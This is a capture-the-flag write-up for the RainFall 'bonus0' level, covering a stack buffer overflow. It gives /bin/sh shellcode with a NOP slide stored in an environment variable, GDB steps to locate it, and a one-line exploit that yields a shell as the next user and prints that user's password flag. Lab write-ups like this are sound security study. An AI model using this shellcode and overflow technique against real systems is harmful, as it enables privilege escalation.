

##### export the shellcode in env variables
```
export CODE=`/bin/echo -ne "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"`
```
 
##### get the env variables in GDB`
`x/40s *((char **)environ)`
```
(gdb) x/40s *((char **)environ)
0xbffff894:	 "SHELL=/bin/bash"
0xbffff8a4:	 "TERM=xterm-256color"
...
0xbfffff60:	 "CODE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220j\vX\231Rh//shh/bin\211\343\061\311̀"
...
```
- the address of the shellcode in ENV is ___0xbf.ff.ff.60___ which points to CODE=....
- we need the address to point into the ___NOPSLIDE___ so we will add a 8 bites ~0x8 to the address (___0xbfffff60 + 0x8 = 0xbfffff68___)
- ___0xbfffff68___ points to ___\x90___ ~ ___\220___

---
#### Exploit && Solution : 
- __arg1__ we fill the buffer ~ 20 : `12345123451234512345`
- __arg2__ we fill the EIP offset ~ 9 + address to shell code + rest of buffer , total = 20 : `A*9` + `4(address of shellcode)` + `8(rest to fill buffer)`

##### Buffer Arg2
```
* sca  = shellCodeAddr
* OEIP = Offset EIP
* RoB  = Rest of Buffer
|--------------------------20-------------------------------| \
|-------9---------|-------4--------|------------8-----------|  |=> BUFFER ARG2
|------OEIP-------|------sca-------|-----------RoB----------| /
```

`cat  <(echo -e "12345123451234512345\nAAAAAAAAA\x68\xff\xff\xbfBBBBCCCC\n") -|  ./bonus0`
---

```
bonus0@RainFall:~$ cat  <(echo -e "12345123451234512345\nAAAAAAAAA\x68\xff\xff\xbfBBBBCCCC\n") -|  ./bonus0
 -
 -
12345123451234512345AAAAAAAAAh���BBBBCCC�� AAAAAAAAAh���BBBBCCC��
whoami
bonus1
pwd
/home/user/bonus0
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9

```
---
bonus0 passed!

|`flag : cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9`
---
